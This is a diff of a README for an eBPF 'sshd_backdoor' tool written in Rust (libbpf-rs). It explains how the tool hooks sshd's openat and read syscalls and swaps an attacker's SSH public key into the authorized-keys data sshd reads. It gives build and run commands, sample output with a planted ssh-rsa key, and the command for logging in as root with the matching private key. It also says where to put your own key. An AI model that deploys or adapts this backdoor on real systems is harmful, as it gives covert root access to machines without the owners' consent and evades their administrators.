@@ -1,50 +1,62 @@
-# libbpf-rust-demo
+> rewrite [Esonhugh/sshd_backdoor](https://github.com/Esonhugh/sshd_backdoor/) in libbpf-rs
 
-## generate vmlinux.h
+## Main Process in ebpf program
+
+> the same as [Esonhugh/sshd_backdoor](https://github.com/Esonhugh/sshd_backdoor/)
+
+Hook OpenAt syscall enter: check if the sshd process call this, log the pid of sshd.
+
+Hook OpenAt Syscall exit: check the pid logged. logging the fd of pid, map pid->fd.
+
+Hook Read Syscall enter: check the pid logged. logging the user_space_char_buffer of pid.
+
+Hook Read Syscall exit: check the pid logged. find the buffer and change the buffer into our Key. Then delete pid in map to avoid blocking administrators' keys be read.
+
+## test
+
+ENABLE DEBUG MODE AT ``common.h:9``
+
+```
+cargo build
+sudo target/debug/sshd_backdoor
+```
+
+your can watch the debug output
+
+```
+sudo cat  /sys/kernel/debug/tracing/trace_pip
+```
+
+when run mock_sshd.py in test folder
+
+```
+sudo python test/mock_sshd.py
+
+output:
+b'....\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC31FcYRWU1GQi6r0jLHwm7Ko9j8WaWFC9Y4RbRjbrRbx22HS/ZWhUr2mKtYR//QxhsP4uMzWOJka+yxxBhTo6GPJboMWrkPMr0R23+cXG2SIub/BeZqNe7qDOadp9Ng/ovzEWtpCQhtkrDSv+98RuHfNCngdpIjPDzf11k+GNNKwGtltO5YmUay/tqVrm8AsnmKhB7Xe0kuNPzHQVTWFB46k6xeWs/0NqHETmYxFznCYxGXYPX7+QMdGPZVvG2MLAxAUN/i6x7oygD6AGYTk9iQyAG/1TTgzSMWVXGC+8ZoSMQCxwNKpVl2Tqf79CmKjo6aTsJOihCtmSMoRRvr9vz9p/KYrSH5pSYbblKQHlYQRqFlaPRsqK13/oRE2cgVu0cU+hMSfMW+COYez0k82S0fck9BdEhU6PLyFby3fs7QHedeKvR6bKGh7kAsTnIbvJNx0VHQ/0X2Tcf0exW8oYFGMq41/aIWfCvjAyHtf66NqbrtIxD11AJjgmf8pgcR80= eki@DUBHE-VM\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
+```
+
+then your can ssh -i with your private key
+
+```
+ssh -i ./test/id root@127.0.0.1
+```
+
+## use your own pub key
+
+replace ``main.rs:100``
+
+## vmlinux.h
+
+this repo contains a vmlinux.h which is generated in Linux DUBHE-VM 5.15.0-58-generic #64-Ubuntu
+
 To generate an updated `vmlinux.h`:
+
 ```shell
 $ bpftool btf dump file /sys/kernel/btf/vmlinux format c > ./vmlinux.h
+$ ln -s ./vmlinux.h src/bpf/vmlinux.h
 ```
 
-## debug
+## Disclaimer
 
-bpf_printk will output to
-
-```
-sudo cat  /sys/kernel/debug/tracing/trace_pipe
-```
-
-## trace points information
-
-You can execute ``sudo ls /sys/kernel/debug`` to query the kernel debug file system for specific information.
-
-For example, the following command can be executed in order to query the parameter format of the execve system call.
-
-```
-# in case of missing file, try to mount debugfs
-# sudo mount -t debugfs debugfs /sys/kernel/debug
-
-sudo cat /sys/kernel/debug/tracing/events/syscalls/sys_enter_execve/format
-
-->
-name: sys_enter_execve
-ID: 716
-format:
-        field:unsigned short common_type;       offset:0;       size:2; signed:0;
-        field:unsigned char common_flags;       offset:2;       size:1; signed:0;
-        field:unsigned char common_preempt_count;       offset:3;       size:1; signed:0;
-        field:int common_pid;   offset:4;       size:4; signed:1;
-
-        field:int __syscall_nr; offset:8;       size:4; signed:1;
-        field:const char * filename;    offset:16;      size:8; signed:0;
-        field:const char *const * argv; offset:24;      size:8; signed:0;
-        field:const char *const * envp; offset:32;      size:8; signed:0;
-
-print fmt: "filename: 0x%08lx, argv: 0x%08lx, envp: 0x%08lx", ((unsigned long)(REC->filename)), ((unsigned long)(REC->argv)), ((unsigned long)(REC->envp))
-```
-
-> https://time.geekbang.org/column/article/484207
-
-## map
-
-> https://arthurchiao.art/blog/bpf-advanced-notes-2-zh/#%E5%9C%BA%E6%99%AF%E4%B8%80%E6%9B%B4%E9%AB%98%E6%95%88%E4%BF%9D%E8%AF%81%E4%BA%8B%E4%BB%B6%E9%A1%BA%E5%BA%8F%E5%9C%B0%E5%BE%80%E7%94%A8%E6%88%B7%E7%A9%BA%E9%97%B4%E5%8F%91%E9%80%81%E6%95%B0%E6%8D%AE
+Do not attempt to use these tools to violate the law. The author is not responsible for any illegal action. Misuse of the provided information can result in criminal charges.
